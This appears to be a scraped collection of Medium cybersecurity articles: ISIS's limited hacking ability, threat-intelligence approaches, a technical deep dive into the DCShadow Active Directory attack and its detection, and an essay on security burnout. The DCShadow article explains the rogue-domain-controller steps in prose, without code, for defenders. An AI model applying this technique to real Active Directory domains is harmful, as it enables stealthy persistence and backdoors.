Clohery, J. (2012). Virtual Terrorism: Al Qaeda Video Calls for ‘Electronic Jihad’. ABC News. Retrieved from http:// abcnews.go.com/Politics/cyber-terrorism-al-qaeda-video-calls-electronic-jihad/story?id=16407875
Constantin, L. (2015). Researchers: IoT devices are not designed with security in mind. Infoworld. Retrieved from http:// www.infoworld.com/article/2906641/security/researchers-iot-devices-are-not-designed-with-security-in-mind.html
Cyber defence. (2017). NATO. Retrieved 25 April 2017, from http://www.nato.int/cps/en/natohq/topics_78170.htm
Denning, D. (2000). Cyber Terrorism. Retrieved from https://pdfs.semanticscholar.org/7fdd/ ae586b6d2167919abba17eb90e5219b7835b.pdf
Denning, D. (2001). Activism, Hacktivism, and Cyberterrorism: The Internet as a Tool for Influencing Foreign Policy. Georgetown University. Retrieved from http://www.iwar.org.uk/cyberterror/resources/denning.htm
Freeman, K. (2014). Game Plan: How to Protect Yourself from the Coming Cyber-Economic Attack (1st ed., p. 80). Regnery Publishing. Gandhi, R.,
Sharma, A., Mahoney, W., Sousan, W., Zhu, Q., & Laplante, P. (2011). Dimensions of Cyber-Attacks: Cultural, Social, Economic, and Political. IEEE Technology And Society Magazine, 30(1), 28–38. http://dx.doi.org/10.1109/ mts.2011.940293
Garrison, A. (2003). Terrorism: The nature of its history. Criminal Justice Studies, 16(1), 39–52. http://dx.doi.org/ 10.1080/08884310309608 GCHQ,
Cert-UK. (2015). Common Cyber Attacks: Reducing The Impact. Retrieved from https://www.gov.uk/government/ uploads/system/uploads/attachment_data/file/400106/Common_Cyber_Attacks-Reducing_The_Impact.pdf
Hudson, R. (1999). The Sociology and Psychology of Terrorism: Who Becomes A Terrorist and Why?. Federal Research Division, Library of Congress. Retrieved from https://www.loc.gov/rr/frd/pdf-files/Soc_Psych_of_Terrorism.pdf
Janczewski, L., & Colarik, A. (2008). Cyber warfare and cyber terrorism (1st ed., pp. 13–14). Hershey [Pa.]: Information Science Reference.
Maras, M. (2014). Computer Forensics (1st ed.).
Sudbury: Jones & Bartlett Learning, LLC. Meserve, J. (2007). Staged cyber attack reveals vulnerability in power grid. CNN. Retrieved from http://www.e-ir.info/ 2013/09/02/the-threat-of-cyberterrorism-to-critical-infrastructure/
National Cyber Security Centre. (2016). Common cyber attacks: reducing the impact. National Cyber Security Centre. Retrieved from https://www.ncsc.gov.uk/content/files/protected_files/guidance_files/common_cyber_attacks_ncsc.pdf National Cyber Security Centre. Attack Type — Watering-Hole Attack. NCSC. Retrieved from https://www.ncsc.gov.uk/ content/files/MWR_Threat_Intelligence_Case%20Study_WHA.pdf
Office of Cyber Security and Information Assurance. (2016). The UK Cyber Security Strategy 2011–2016. Cabinet Office. Retrieved from https://www.gov.uk/government/uploads/system/uploads/attachment_data/file/516331/ UK_Cyber_Security_Strategy_Annual_Report_2016.pdf
Protecting your organisation from ransomware. (2016). Ncsc.gov.uk. Retrieved 24 April 2017, from https:// www.ncsc.gov.uk/guidance/protecting-your-organisation-ransomware
RAND Corporation. (2005). Aum Shinrikyo, Al Qaeda, and the Kinshasa Reactor. Retrieved from http://www.rand.org/ content/dam/rand/pubs/documented_briefings/2005/RAND_DB458.pdf
SANS Institute. (2003). Federal Intrusion Detection, Cyber Early Warning and the Federal Response.
SANS Institute Reading Room. Shea, D. (2003). Critical Infrastructure: Control Systems and the Terrorist Threat. Retrieved from https://fas.org/irp/crs/ RL31534.pdf
Thomas, P. (1997). Experts prepare for ‘an electronic Pearl Harbor’. CNN (Washington). Retrieved from http:// edition.cnn.com/US/9711/07/terrorism.infrastructure/
Ulmanu, A. (2017). Study: Companies largely unconcerned with IoT security. Bitdefender. Retrieved from https:// www.bitdefender.com/box/blog/iot-news/study-companies-largely-unconcerned-iot-security/?sm_id=SMGlobal
United States Department of State. (2002). Patterns of Global Terrorism (p. 63). Retrieved from https://www.state.gov/ documents/organization/10319.pdf Vatis, M. (2001). Cyber Attacks During The War On Terrorism: A Predictive Analysis. Institute for Security Technology Studies at Dartmouth College. Retrieved from http://www.ists.dartmouth.edu/docs/cyber_a1.pdf What are phishing scams and how can I avoid them?. (2017). Kb.iu.edu. Retrieved 24 April 2017, from https://kb.iu.edu/ d/ar","['Cybersecurity', 'Cyberterrorism', 'Cyber Crime']"
Cyber Terrorists Can’t Cyber - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/cyber-terrorists-can-t-cyber-144406a2d78b?source=tag_archive---------0-----------------------,"The Islamic State’s is running out of hackers after the US announced the death of the Bangladeshi Siful Haque Sujan, aka Abu Khalid al-Bengali. Sujan was possibly the top ISIS hacker following the death-by-drone of Junaid Hussain, aka TRiCK, aka Abu Hussain al-Britani.
Junaid had some minimal hacking skills having at least been in a black hat hacking crew (TeaMpoisoN) when he was arrested for hacking Tony Blair’s email account. Although labeled a hacker by the US forces that killed him, Sujan, had no such pedigree or skillset.
Sujan appears to have had technical literacy, and possibly even knew how to program, but he does not appear to have had cyber security skills. It seems likely that he gained the ISIS hacker mantel by simply being a “computer guy” at the ISIS shop. The most specific the Western forces could come up with for a description for his hacking responsibilities was “anti-surveillance,” i.e. he read privacy manuals.
ISIS has not had much luck conducting offensive cyber attacks. The biggest hack attributed to the ISIS hacker crew — Cyber Caliphate — was the TV5monde hack, but it was actually a false flag operation by Russia. Even if it was actually ISIS affiliated hacktivists, it is no more impressive than any other hacktivist attack (i.e. low skill).
ISIS’ biggest actual hack was a trivial take over of the CENTCOM Twitter and YouTube accounts. This sort of account takeover is similar to what Junaid did against Tony Blair’s email account. In fact, taking over Twitter accounts seems to be common practice in ISIS Twitter circles.
The only cyber security skills that have been displayed are very simple attacks that rely on luck and perseverance more than skill. The general level of ISIS cyber operations has been no more than entry level. They appear to have no medium or advanced cyber capability at all. The extent of their cyber capabilities has been:
There was one Kosovan hacker, Ardit Ferizi, associated with ISIS who was able to do web site hacks. He was caught quickly due to his terrible operational security — he used his real name on his Twitter account that he used to post hacked data and interact with ISIS accounts. Reading between the lines suggests that he used SQL injection, or other basic web hacking techniques. It seems very likely this was the limit of his meagre skills.
Rumors inside Al Raqqa says that Hussain managed to get ISIS a huge amount of money, through hacking,
Source: http://www.raqqa-sl.com/en/?p=1349
It is entirely possible that Junaid was engaged in cyber criminal activities that generated money. For example, by hacking web retailers and stealing credit cards. The usual approach is to steal something of value and then convert it to cash. Typically this will involve using stolen credit cards to purchase items that can be converted to cash. How TRiCK would cash out in Syria is something of a mystery, but it is possible. Petty cyber crime of the sort that TRiCK was capable of simply does not generate “a huge amount of money.”
The most advanced cyber operation ISIS conducted was one malware campaign using extremely primitive malware targeting the anti ISIS “Raqqa is being Slaughtered Silently” media group. This campaign has been tentatively linked to ISIS based mostly on cui bono attribution. While the use of custom malware and targeted emails is a similar playbook to APT style operations the similarities stop there. This attack was poorly executed and used crude homebrew malware. There don’t appear to have been repetitions of this style of attack either, or improvements over time. This suggests that cyber ops failed to provide the information they needed, and the necessary investment in personnel, training and tooling has not happened.
Despite breathless articles beating the “ISIS cyberterror” drum ISIS have struggled to recruit cyber talent to their cause. Their internal development and training program is an embarrassment. ISIS struggles to develop their own cyber security content, both for anti surveillance and also for information security. Their training proposal is based on repurposed existing penetration testing tutorials. Prominently featuring a series of basic introduction to Metasploit videos.
Although a motivated and skilled computer user could train themselves to use Metasploit using these videos, this is not the best approach to developing a skilled cyber operator. Watching online videos won’t make someone a gourmet chef any more than it will make them a hacker. To develop a cyber operations center requires talent, skill, funding and training. Starting with a video course on Metasploit is as laughable as starting a Michelin star restaurant by watching Jamie Oliver YouTube videos.
Don’t believe the hype. From their dwindling talent pool of low grade hackers, to their limited cyber operations and their poor training regime, it is clear that ISIS do not pose a credible cyber threat to anyone. While this may change in the future (anything’s possible), it seems very unlikely that they will possess the capability to do any damage to anyone. ISIS simply are not a serious cyber threat actor.
Written by
","['Cybersecurity', 'ISIS', 'Cyberterrorism']"
Cyber Threat Intelligence: Comparing the incident-centric and actor-centric approaches,https://medium.com/@markarenaau/cyber-threat-intelligence-comparing-the-incident-centric-and-actor-centric-approaches-f20cfba2dea2?source=tag_archive---------6-----------------------,"Note: This was originally posted on Intel 471’s website in June 2015.
When it comes to cyber threat intelligence, the security industry mostly appears to take the view that indicators of compromise (IOCs) are the best approach to initiate/drive the intelligence process. If we take a step back and look at traditional intelligence concepts, we will find the following definition of intelligence:
“Simply defined, intelligence is information that has been analyzed and refined so that it is useful to policymakers in making decisions — specifically, decisions about potential threats to our national security.”
Consumers of indicators of compromise within an enterprise are typically on the ground network defenders yet the definition above shows intelligence defined as being useful to policymakers or executives. Based on this definition, we will make the case that an actor-centric approach to cyber threat intelligence enables predictive analysis and hence is useful to executives within your organization. I’ll preface this blog post by saying that while Intel 471 provides actor-centric cyber threat intelligence collection and information, we are not favoring one approach over the other. Additionally, we are not implying these are the only approaches to building a threat intelligence program. Rather, we believe that any threat intelligence program should include both an incident-centric and actor-centric approach.
Brian Krebs recently wrote an article that illustrated the fact there is real value in adversary or actor-centric intelligence collection when assessing cyber threats and the risk posed by them. The article also highlighted there are efficiency gains to be had through understanding threat actor and groups. Brian sums it up nicely with the following quote from ThreatConnect:
“Now if we consider for a moment the man hours and ad hoc reprioritization for many security teams globally who were queried or tasked to determine if their organization was at risk to Rombertik — had the organizations also had adversary intelligence of Ogundokun’s rudimentary technical and operational sophistication, they would have seen a clearer comparison of the functional capabilities of the Rombertik/Carbon Grabber contrasted against the operator’s (Ogundokun) intent, and could have more effectively determined the level of risk.”
The incident-centric (or IOC-centric) approach typically begins with the detection of an event such as reconnaissance, or compromise. Really we’re operating in an incident-centric approach anytime the intelligence process is initiated and/or driven from IOCs (Indicators of Compromise). For example, a response effort might identify the following that kicks off the intelligence process:
Using these IOCs we want to build out an understanding of the tactics, techniques and procedures (TTPs) and the higher-level campaign associated with this event. We are effectively trying to understand:
An exploit kit from an innocent user browsing websites?
A targeted spear-phish that was sent to the compromised user?
What exploits/exploit method was used to compromise the system?
Pros of the incident-centric approach:
Cons of the incident-centric approach:
Exploits to purchase;
Malware to purchase;
Hosting.
There is continuous debate in the information security community about the usefulness of attribution of threat actors and groups, but we believe that attribution to various levels (person, group, nation-state, etc.) provides valuable insights that support decision-making at all levels.
The actor-centric approach starts with threat actors or groups, which is the reverse of the incident-centric approach. It should be noted that by solely focusing on threat actors that have mentioned your organization, you will lose the ability to be proactive. Brand monitoring can serve a valuable purpose, but we do not believe that it’s effective approach in isolation to collect proactively against threat actors. There are a number of threat actors that are attempting to impact your organization, but you may not observe them mentioning your organization by name. Therefore we believe it is best to focus on all actors, to include enabling actors, that might impact your sector/vertical.
Starting with the threat actors themselves, we want to understand:
Once we understand this actor-centric information, we want to fuse this information through analysis and correlation with other intelligence information. Ideally we could then tie their TTPs and campaigns to specific IOCs as well.
Pros of the actor-centric approach:
Cons of the actor-centric approach:
The incident-centric approach is a required aspect of any mature threat intelligence program. On its own, it’s effectively the equivalent of the United States government monitoring Russia’s missile program solely by watching Russian soldiers firing missiles at and inside Ukraine, which they almost certainly are. In that example, you can be sure that the US government monitors Russian defense contractors, enablers and developers of Russian’s missile program at the direct person and organizational level.
With regards to the actor-centric approach, one could argue whether it is actionable or not. On its own and in isolation it probably isn’t, but when fused, stored and correlated with your own organization’s data/information and other sources of information it can be both predictive and actionable. Feeds of IOCs are frequently incorrectly referred to as actionable cyber threat intelligence within the security industry when this is simply raw data and another source of information.
If your organization simply takes external feeds of IOCs and automatically blocks them, you do not have an intelligence program. If you analyze (with a person) multiple sources of information in order to produce an output that is timely, relevant to your organization, and based on predetermined requirements, then you have an intelligence program.
Written by
","['Cybersecurity', 'Cybercrime']"
DCShadow explained: A technical deep dive into the latest AD attack technique,https://blog.alsid.eu/dcshadow-explained-4510f52fc19d?source=tag_archive---------2-----------------------,"Update 19/02/2018 : Add a reference to Uncover-DCShadow, a proof of concept helping Blue teams to detect DCShadow attack.
On January 24th 2018, Benjamin Delpy and Vincent Le Toux, two security researchers, have released during the “BlueHat IL” security conference a new attack technique against Active Directory infrastructure. Named “DCShadow”, this attack allows an attacker having the appropriate rights to create a rogue domain controller able to replicate malicious objects into a running Active Directory infrastructure.
In this article, we will explain the technical foundations the attack relies on and discuss the consequences for the security of a running Active Directory infrastructure. Finally, we will shed a light on how blue teams could detect this kind of attack.
The holy grail for red teamers or attackers willing to compromise an Active Directory infrastructure is to be able to obtain users and computers credentials without being noticed by detection countermeasures.
For this purpose, several attack techniques have been developed through time: LSASS injection, abusing Shadow Copy, NTFS volume parsing, ESE NT operations, sensitive attribute manipulation, etc. More details are available on the impressive synthesis from ADSecurity.org.
Among all these noisy attacks, one of them is connected to the “DCShadow” attack. Introduced in 2015, the “DCSync” attack relies on the ability for the members of the Domain Admins or Domain Controllers groups to ask a domain controller (DC) for data replication (to achieve this task, the GetChangesAll right, granted by default to administrative accounts and DCs, was necessary). In fact, as described in the MS-DRSR specification for domain controller replication, these groups can request the Domain Controller to replicate AD objects (including user credentials) through the GetNCChanges RPC. More technical details on the attacks are available on the ADSecurity.org blogpost.
One of the main limitation of the “DCSync” attack is the impossibility for an attacker to inject new objects in the targeted AD domain. Of course, this attacker could take ownership of an administrative account using the good old Pass-The-Hash technique and inject objects afterwards, but it requires more efforts, more steps, meaning a greater probability of being busted by blue teams. The “DCShadow” attack removes this limitation by reversing the “DCSync” attack paradigm.
With “DCShadow”, attackers no longer try to replicate data but will register new domain controllers in the targeted infrastructure to inject Active Directory objects or alter existing ones (by replacing the attributes’ content). The idea of a rogue domain controller is not new and has been mentioned multiple times in previous security publications but required invasive techniques (like installing a virtual machine with Windows Server) and to log on a regular domain controller to promote the VM into a DC for the targeted domain. Not very discrete.
In order to understand the genius ideas behind “DCShadow”, it is important to clearly grasp what a domain controller is and how it is registered in the Active Directory infrastructure.
As described in MS-ADTS (Active Directory Technical Specification), Active Directory is a multi-master architecture relying on dedicated services. The DC is the service (or the server hosting this service depending on your point of view) which hosts the data store for AD objects and interoperates with other DCs to ensure that a local change to an object replicates correctly across all DCs.
When a DC is operating as RW DC, the DC contains full naming context (NC) replicas of the configuration, the schema, and one of the domain naming context of its forest. In this way, every RW DC holds all objects of a domain, including credentials and any kind of secrets (like private or session keys). As such, there is no need to remind that DCs are the one and only elements blue teams should be focused on protecting (Administrative accounts or permissions are just two of the many ways to access a DC).
Describing in detail the technical ways and means of a DC could be complex and will not help to understand the purpose of the “DCShadow” attack. To be concise, a server can be called a domain controller if it offers the following 4 key components:
In addition to hosting these services, a domain controller in the making should be registered in the directory infrastructure to be accepted by another DC as a replication source provider. The data replication is orchestrated by a built-in process (running on the NTDS service) called the Knowledge Consistency Checker (KCC).
The major function of the KCC is to generate and maintain the replication topology for replication within and between sites. In other words, the KCC process elects which DC will communicate to which other to create an efficient replication process. Within a site, each KCC generates its own connections. For replication between sites, a single KCC per site generates all connections. The following schema illustrates the two kinds of replication.
By default, the KCC initiates AD replication topology every 15 minutes to ensure consistent and regular propagation. Using the USN associated to every AD object, the KCC recognizes changes that occur in the environment and ensures that domain controllers are not orphaned in the replication topology. Fun fact, historically Active Directory replication process could have been made through RPC (like DrsAddEntry) but also through SMTP (for the Schema and Configuration partition only)!
One part of the great job made by the researchers behind “DCShadow” was to identify the minimal set of changes required to inject a new server in the replication topology and therefore inject malicious information abusing this process while remaining stealthy.
As explained in the following section of this article, the “DCShadow” attack aims to register new domain controllers to inject malicious AD objects and so create backdoors or any kind of illegitimate access or right. To reach this goal, “DCShadow” attack must modify the targeted AD infrastructure database to authorize the rogue server to be part of the replication process.
As mentioned in the MS-ADTS specification, a domain controller is represented in the AD database by an object of class nTDSDSA that is always located in the configuration naming context of a domain. More precisely, each DC is stored in the sites container (object class sitesContainer), as a child item of a server object.
A quick look at the schema shows that NTDS-DSA objects can only be created as children of server objects, which in turn can only be part of organization or server objects:
In this way, domain controllers (nTDSDSA objects) can only be created in the Configuration or Domain NC. In practice, it seems only the nTDSDSA objects stored in the site container (sitesContainer object) are taken into consideration. As the KCC relies on the site information to compute its replication topology, it seems logical that only these objects are used. Note that creating an nTDSDSA object is not possible using the LDAP protocol.
You would have understood it, the main action made by the “DCShadow” attack is to create a new server and nTDSDSA objects in the Configuration partition of the schema. Doing so provides the ability to generate malicious replication data and inject them to other domain controllers.
Now that we understand what the “DCShadow” attack do, we need to understand what kind of privileges are required to create nTDSDSA objects in the Configuration partition. A quick look in the permissions show that only BUILTIN\Administrators, DOMAIN\Domain Admins, DOMAIN\Enterprise Admins and NT AUTHORITY\SYSTEM have control rights on the targeted containers.
This quick analysis allows us to conclude that the “DCShadow” attack is not a privileges escalation vulnerability, but a misappropriation of Active Directory mechanism. It doesn’t allow red teamers to gain privileges but give them another solution to become persistent or to make illegitimate actions in a directory infrastructure. It should thus be added in the category of another sneaky AD persistence trick and not as a vulnerability to fix.
As described in the previous paragraph, the “DCShadow” attack relies on the addition of a new nTDSDSA object in the Configuration partition to register itself as a new member of the replication process. However, adding this sole object is not enough to allow our rogue server to initiate replication. In fact, to be part of the replication process we need to take care of two requirements:
By using a valid computer account, a rogue server can be treated as a trustworthy AD server. The Kerberos SPN attributes will provide authentication support for other DCs. Therefore, every nTDSDSA object is linked to the computer object through the serverReference attribute.
Despite the theoretical possibility to achieve this with a user account, it seems much easier and stealthy to use a computer account. In fact, it will be automatically registered in the DNS infrastructure (which will allow other DCs to locate our resource), will natively have the required attributes set and will have its authentication secret automatically managed.
In this way, the “DCShadow” attack will use a legitimate computer account to be able to authenticate to other DCs. Although the computer object and the nTDSDSA object will bring the ability to authenticate to other DCs, the “DCShadow” attack still needs to let other DCs to connect to the rogue server to replicate illegitimate information from it.
This last requirement is fulfilled using the Kerberos Service Principal Name (SPN). As extensively explained in several publications, SPNs are used by Kerberos service (KDC) to encrypt the Kerberos ticket with the account associated with the SPN. In our case, the “DCShadow” attack will add SPNs on the regular computer object used to authenticate.
One of the key findings of Benjamin Delpy and Vincent Le Toux was to isolate the minimum set of SPNs required for the replication process to go through. The results of their studies show that two SPNs are required to let another DC to connect to the rogue server:
For example, the two SPNs required by our rogue server (named “roguedc” with the DSA GUID 8515DDE8–1CE8–44E5–9C34–8A187C454208 in the alsid.corp domain) are as follows:
When triggering its attack, “DCShadow” will set those two SPNs to its targeted computer account. More precisely, the SPNs will be set using the DRSAddEntry RPC function as described in the CreateNtdsDsa function documentation (more details about MS-DRSR RPC are provided in the next section).
For now, we can register our rogue domain controller into the replication process and be authenticated by another DC. The remaining step is now to force the DC to initiate the replication process with our malicious data.
In the previous parts, we gathered all the requirements to register in the replication process, in this final chapter we will study how the “DCShadow” attack injects its illegitimate information into the DNS infrastructure.
To serve illegitimate data, the rogue domain controller will have to implement the minimal set of RPC functions required by the MS-DRSR specifications: IDL_DRSBind, IDL_DRSUnbind, IDL_DRSGetNCChanges, IDL_DRSUpdateRefs. The IDL of this function are provided by Microsoft in its open specifications and are now implemented into Benjamin Delpy’s Mimikatz tool.
The final step of the “DCShadow” attack is to trigger the replication process. To do so, two strategies can be conducted:
Forcing the replication with the IDL_DRSReplicaAdd RPC is the last step taken during a “DCShadow” attack. It allows to inject arbitrary data into a targeted AD infrastructure. Doing so, it becomes trivial to add any backdoor in the domain (by adding new member on an administrative group, or by setting SID history on a controlled user account for example).
The following chart summarizes the different operations achieved during a “DCShadow” attack.
As explained in the research paper, blue teams in charge of AD security monitoring usually rely on event log collection. Computers that are members of a domain are configured to push their logs to a central SIEM to be analyzed.
The first problem with this approach is that only legitimate computers send their logs to the log collector. During the “DCShadow”, the event logs related to the injection of new data are only created on the attacker’s machine, which will obviously not signal itself by sending events to the SIEM. In this way, the “DCShadow” attack can be stealthy as only a few event logs will be generated by legitimate computers.
In fact, this article explains that several prerequisites actions should be made before injecting the rogue data information into the targeted AD. Unfortunately, the AD modifications involved in setting-up a rogue DC are rarely included in logging policies. For example, Configuration NC changes are almost never considered. While it is possible to be alerted on such changes, determining if such an event is caused by malicious activity or regular AD operations is time consuming and impractical.
Blue teams need a complete redesign of their strategy and shift their focus from log analysis to AD configuration analysis. The naïve approach would be to monitor replications (DrsGetNCChanges RPC changes). In fact, by default, a SACL entry set on the root object of the domain logs the use of extended rights except for domain controllers. In this way, a replication with a user account or non-DC machine must be pretty easy to identified. However, we do not feel this method is the most efficient one. From our point view, three strategies should be implemented to detect “DCShadow” attacks:
Despite the lack of event logs, there areseveral ways to detect DCShadow.
As a first stage, we could think about network detection. In fact, DCShadow relying on replication process, it generates characteristic network pattern as illustrated in the following figures.
However, some limitations have to be considered :
A more elaborate approach would be to monitor to replication of Active Directory objects to identify suspicious patterns.
In fact, DCShadows requires to create several objects in a directory infrastructure, and Active Directory offers several ways to be informed when such event occurs (without requiring any administrative rights).
The basic idea is to detect the creation of the nTDSDSA object and the set of the SPN E3514235–4B06–11D1-AB04–00C04FC2DCD2 on an illegitimate machine using the replication process or notification.
To illustrate this approach, Alsid has released a series of proof-of-concepts named UncoverDCShadow to help blue teams detect DCShadow attempt. Developed in PowwerShell they can be easily connected to a SIEM infrastructure to help it detect such attack.
UncoverDCShadow uses the ability to make asynchronous calls to the AD database using LDAP. Using the well-known (or not so well) LDAP server control LDAP_SERVER_NOTIFICATION_OID (1.2.840.113556.1.4.528), any user can receive information about any created, modified or deleted object of the entire Active Directory database. As illustrated in the following video, it becomes quite easy to detect the use DCShadow.
More detail about how UncoverDCShadow works are available HERE.
What is most important to take away from this analysis is that “DCShadow” is not a vulnerability but an innovative way to inject illegitimate data into an AD infrastructure.
No unprivileged attacker will ever be able to use it to escalate their privileges and gain administrative access to your AD using “DCShadow”. Bottom-line is: if your AD is properly configured and secured, you do not need to take any urgent actions.
“DCShadow” does not require any urgent patching campaign nor special configuration to be applied, this has nothing to do with WannaCry/NotPetya incident response.
Not being a vulnerability, “DCShadow” will not be patched by a Microsoft update. Trying to counter it would need to change the way AD works, and hence break the system. The authors of the research previously published the “DCSync” attack and Microsoft did not issue any patch, as it only uses legitimate APIs. “Fixing” it would mean forbidding DC replication. If it ain’t broke, don’t fix it. AD is not broken.
However, the fact that a new attack method is publicly available for anyone to use needs to be considered. It offers an extremely stealthy way for privileged attackers to perform actions, so detection strategies should be updated to reflect this new threat. Traditional event log analysis methods will probably fail to detect “DCShadow” usage. To efficiently detect this attack technique, it requires being able to continuously monitor the AD database to isolate illegitimate changes. This is what we do at Alsid and we are very proud to already protect our customers against this attack. For more information on how we tackle this challenge, head to www.alsid.eu.
Written by
","['News Stories', 'Security Labs', 'Knowledge Center', 'MS-DRSR ', 'MS-ADTS', 'Kerberos', 'NTLM', 'Netlogon', 'WDigest', 'GPO', 'SMB', 'LDAP', 'DNS provider', 'repsTo', 'DCShadow', 'Active Directory', 'Cybersecurity', 'Dcshadow', 'Mimikatz', 'Information Security']"
Dealing with “Security Nihilists” - HackerNoon.com - Medium,https://medium.com/hackernoon/dealing-with-security-nihilists-b08e9f87052c?source=tag_archive---------6-----------------------,"Tell me.
How often in your career do you have to deal with an answer being directly in front of you, or the client you are working for, but they just won’t do what it is you’re recommending?
Now, I’m not saying that there aren’t other professions (technical or otherwise) that don’t have this problem, but it is really common in information security. Let me introduce you to some scenarios to see if you find yourself nodding, saying “Yup, I been there.”
You’re a SOC (security operations center) analyst for Bigname McBigCorp. Your job is running vulnerability scanners and verifying that high risk vulnerabilities get remediated across the enterprise, but especially for internet-facing systems. Your scanners notify you that a critical vulnerability in a common web application platform that could easily result in that box getting owned. As in, RCE (Remote Code Execution). As in, POC (proof of concept) exploit code exists for said vulnerability. You present your findings, you make a plan to patch, you push your plan forward at the change control meeting, aaaaaaaand denied.
Nope, denied. Upgrading the web application platform requires rebuilding the application, requires testing, requires doing a bunch of work, and no thanks. We’ll handle it later. Do we have anything in place to ensure that we can spot this type of attack in the wild? You don’t have access to any NSM countermeasures to know whether or not signatures exist to block, or at least DETECT it , or have the ability to install host-based security solutions on the affected server(s). Oh well, you’re sure that if you notified your boss of the issue that somebody, in the appropriate group has something in place to catch this. It’d be an utter shit-show if one of our boxes got popped and this vulnerability was the initial access, discovered months later. So you keep your messages and emails that state you mentioned the vulnerability and hold on to them, as CYA (Cover your ass) material. Good thing you did, because Bigname McBigCorp got owned pretty handily and it turns out the vuln you raised a stink about was the initial access. Not only that, when the CEO got grilled on how this was allowed to happen, he threw the IT security team under the bus.
You’re a penetration tester working for Slow-6, a professional security organization that offers security assessments, or “penetration tests” among other services. You have taken a week-long gig with a large customer. You got shells. Man, did you get shells. Your report at the end of the assessment feels about as thick as a tome. The company’s CISO and GRC personnel ask for you to hurry in producing the report.
Normally, people aren’t in a hurry to hear bad news from the pentester, so in pressing your luck, you ask “What is the hurry?” Maybe they have an upcoming audit, and they need to ensure they’re in compliance with whatever rules govern their vertical on data security. Maybe they want to squeeze some staff or gear out of the security budget before the end of the quarter or fiscal year. Any of these would have been acceptable. Instead, you got the answer “We need your report so that we can sign off on it and assume the risks.” Meaning you just spent your time writing up a professional report (something the OSCP, the “gold standard” of penetration testing certifications grills you on very hard in order to pass, mind you) for fuck-all nothing. Nobody is going to read it, nobody is going to learn anything from it, if you come back, you’re likely going to find the same weaknesses.
“Doesn’t matter”, they say.
Everything is running fine, and we’re not going to rock the boat. Give us the report, collect your pay, and move on. More than a little demoralized, you do as they say, as your NDA bars you from ‘naming and shaming’ the company that treats significant risks with such brazen contempt.
An organization is sent an e-mail. The email states that hackers have stolen PII (Personally Identifiable Information)and that they’re going to dump it publicly unless their ransom of some ungodly amount of money is paid.
They attached screenshots of information pulled from several large databases as proof of their deeds. Your investigation into this incident confirms that this is a thing that happened, but you don’t know how they got in yet.
The company doesn’t care. “Pay the ransom. Nobody is to know about this. If anyone asks about paying it out, say that it was the result of a bug bounty.” You know that this is wrong, both morally, and ethically, but you’re not about to stick your neck out to lose your job over their bad decisions. After all, if the CISSP has taught you anything its that management is responsible for poor decisions.
These situations (and so many more) lead to information security professionals feeling dejected and defeated. What happens to someone when they feel like their work means nothing? Like they’re just going to face more of the same bullshit day after day? Week after week? Month after month? You start to become apathetic. What was once your passion and something you were dedicated to, body and soul, turns into a 9 to 5 gig that you merely exist at in order to pay the bills.
You no longer feel the drive and passion you used to. You don’t want to learn about new tech, new techniques, new methods, or new tradecraft, because why bother? No corporation wants to bother with actually bettering their security posture, so why bother with the passion to learn more and keep up with the latest? You don’t want to go to trade conferences anymore because you feel like its an echo chamber where we’re constantly being told to do better and how these mega breaches were so easily preventable, when we already fucking knew that.
So you don’t care anymore. You don’t put in your 100% anymore. You sincerely doubt the worth of information security practices. After all, we’ve been parroting the same 20 security controls for decades, and we can’t even get past patch and asset management, some of the most important, and foundational concepts for good security — What is actually in your environment, and has it been kept up to date?
The OWASP top 10 has been around since at least 2010, and we still see sqli (SQL injection) and command injection vulnerabilities EVERYWHERE, especially in IoT devices and SOHO routers, the most widely deployed, vulnerable devices that are the least likely to ever be patched again once deployed.
Oh, and while we’re talking about the absolute dumpster fire that is IoT, here’s a reminder that the MIRAI botnet took down dyn’s DNS servers and killed half the internet for a day last year.
The guidance is out there. The water is clean and plentiful. And yet, the horses under your care and guidance refuse to drink. You can’t shoot them and ship them off to the glue factory, so all you can do is watch and wait. You wonder how you got into this situation, and if maybe a career change might be a good idea, but then you realize that most professions experience variations of the same thing. Especially information technology professions:
IT/Sysadmin/Netadmin: not enough investment into backups or infrastructure, but they don’t care so long as it runs and results in profits. Also, in spite of the infrastructure providing revenue, IT is still seen as a “cost center”. Management doesn’t care. Its running now, that's a problem we can deal with later.
Dev/Programmer: Having to implement ugly, shitty hacks all the time, because your project isn’t being given enough time to actually ship out a product that you can be relatively confident in, from a testing and QA standpoint. Management doesn’t care. only the project timeline and shipping shit that customers will buy matters. (see also — that other article I wrote about “Rick”, and how power players are left to rot.)
This constant race to the bottom and shortsightedness is what breeds apathy and nihilism. It is the fuel that fosters burnouts. Trust me, I speak from experience. So the next time you ask a professional to stop being so defeatist/apathetic/nihilistic about security, stop and think about what brought them there in the first place.
You may be asking, if I have experience with burnout, then why am I still here? I managed to come back from the brink. I realized that no matter what happens to the horses, that I am still a well-trained and capable professional. That the decisions that other people made in response to the good and professional work I have done is not my fault. It still irks me that people can be so criminally shortsighted (and that their short-sightedness can affect my life) but I’m learning to live with it.
I also came to realize that I am more than my profession. I have a family. Pets. Hobbies. Things to do. Places I want to see. And only so much time left on this earth to do it. I don’t live to work anymore, I work to live.
And while I have a reasonable responsibility to keep up on the latest happenings in technology and security, if I don’t want to go to a conference or I want to take a break from social media to go to the movies or take a small vacation with my wife, that I can, and I should do that.
Nobody is going to remember you or thank you for finding, reporting and/or patching that vulnerability. Nobody will remember how awesome your tools are, or how leet your 0days are after you’re dead. Your friends, family, and loved ones will be the ones to remember you and your exploits (no pun intended). Its up to you to figure out what matters to you and what is worth dedicating time to.
I took time for myself and my family, and in so doing, came out of burnout with more to live for. In time, my enthusiasm for information security returned, but tinged with pointing out how utterly ridiculous it all is (e.g. shitposting). Some people don’t like that. You don’t have to. This is how I’m coping, and you’re more than welcome to not listen to me.
Edit: I would like to thank “hacks4pancakes” for sharing her list of information security topics. I was inspired by that list to write about this topic.
Written by
","['About', 'Help', 'Go Home', 'Security', 'Nihilists', 'Security Nihilists', 'Cybersecurity', 'Technology']"
Death by PowerPoint - thaddeus t. grugq - Medium,https://medium.com/@thegrugq/death-by-powerpoint-53472da3cd5?source=tag_archive---------9-----------------------,"There was a clever influence op by Netanyahu aimed at the US president. It was based on carefully packaged misinformation and props. I’m not going to talk about it, since that aspect is being covered better by more informed people. I’m going to talk about the deception operation aimed at the Iranian intelligence service (VEVAK) which was a critical, but mostly under appreciated, component of the presentation. There’s a quick summary of what happened, but then lets get to the deception op because that is way more interesting.
